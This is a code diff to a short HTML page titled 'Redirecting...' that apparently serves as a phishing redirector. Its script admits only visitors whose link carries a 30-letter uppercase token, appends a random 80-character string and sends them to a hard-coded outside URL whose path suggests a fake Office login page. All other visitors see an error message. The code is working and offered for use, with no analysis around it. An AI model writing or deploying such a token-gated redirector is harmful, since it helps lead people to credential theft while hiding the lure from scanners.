@@ -1,5 +1,3 @@
-Written by Sinzuxx
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,10 +5,10 @@ Written by Sinzuxx
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <script>
-        // Replace 'https://example.com' with your desired redirect URL
+        // Replace with your actual redirect URL
         const redirectTo = "https://iw.kicgqpj2.sa.com/m3.live/office-3D8/index.php";
 
-        // Function to generate a random string of mixed characters (uppercase, lowercase, numbers)
+        // Function to generate a random string (80 characters, mixed-case)
         function generateRandomString(length) {
             const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
             let result = "";
@@ -20,25 +18,25 @@ Written by Sinzuxx
             return result;
         }
 
-        // Function to get query parameters by name from the URL
+        // Function to get query parameters from the URL
         function getQueryParam(param) {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get(param);
         }
 
-        // Check if the 30-character uppercase string exists in the URL
+        // Extract and validate the 30-character uppercase string from the URL
         const upperString = getQueryParam("upperString");
 
-        if (upperString && upperString.length === 30) {
+        if (upperString && /^[A-Z]{30}$/.test(upperString)) {  // Ensures it is exactly 30 uppercase letters
             // Generate a random 80-character string
             const randomString = generateRandomString(80);
 
-            // Redirect to the desired URL with the random string appended
-            const newUrl = redirectTo + "?" + randomString;
-            console.log("Redirecting to:", newUrl);  // Log for debugging purposes
+            // Redirect with a proper query parameter
+            const newUrl = `${redirectTo}?randomString=${randomString}`;
+            console.log("Redirecting to:", newUrl);  // Debugging log
             window.location.href = newUrl;
         } else {
-            // If no valid 30-character uppercase string, display a message
+            // If the condition is not met, show an error message
             document.body.innerHTML = "<p>Invalid URL. Please provide a valid 30-character uppercase string in the URL.</p>";
         }
     </script>
